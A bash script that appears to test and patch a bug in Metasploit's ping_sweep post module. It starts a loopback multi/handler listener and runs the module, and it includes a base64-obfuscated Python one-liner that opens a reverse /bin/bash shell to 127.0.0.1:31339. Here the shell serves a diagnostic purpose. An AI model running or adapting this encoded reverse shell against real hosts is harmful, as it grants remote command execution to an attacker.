#!/bin/bash

fix () {
  echo "Problem detected with scanner"
  if [ -d /opt/metasploit-framework/embedded/framework/modules/ ]
  then
    MSF_DIR=/opt/metasploit-framework/embedded/framework/modules/
  elif [ -d /usr/share/metasploit-framework/modules/ ]
  then
    MSF_DIR=/usr/share/metasploit-framework/modules/
  else
    read -p "What is the metasploit modules directory?" MSF_DIR
  fi
  sed -i '/^class MetasploitModule.*/a \ \ include Msf::Post::File' "$MSF_DIR/post/multi/gather/ping_sweep.rb"

  echo "Bug patched!"
}

read -r -d '' script <<- EOF
  workspace c3_badmsf;

  echo Loading loopback listener;

  use exploit/multi/handler;
  set -g LHOST 127.0.0.1;
  set LPORT 31339;

  exploit -z;

  echo Upgrading shell;

  sessions -u 1;

  echo Running test;

  use post/multi/gather/ping_sweep;
  set RHOSTS 127.0.0.1;
  set SESSION 2;

  exploit;

  exit;
  exit;
EOF

msfconsole -qx "$script" | tee /dev/stderr | grep cmd_exec && fix || echo no problem detected &

for i in $(seq 30 -1 1)
do
  echo WAITING: $i seconds
  sleep 1
done

python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAsICAgICAgc3VicHJvY2VzcyAsICAgICAgb3M7ICAgICAgIGhvc3Q9IjEyNy4wLjAuMSI7ICAgICAgIHBvcnQ9MzEzMzk7ICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAsICAgICAgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICAgcy5jb25uZWN0KChob3N0ICwgICAgICBwb3J0KSk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAsICAgICAgMCk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAsICAgICAgMSk7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAsICAgICAgMik7ICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"&
wait
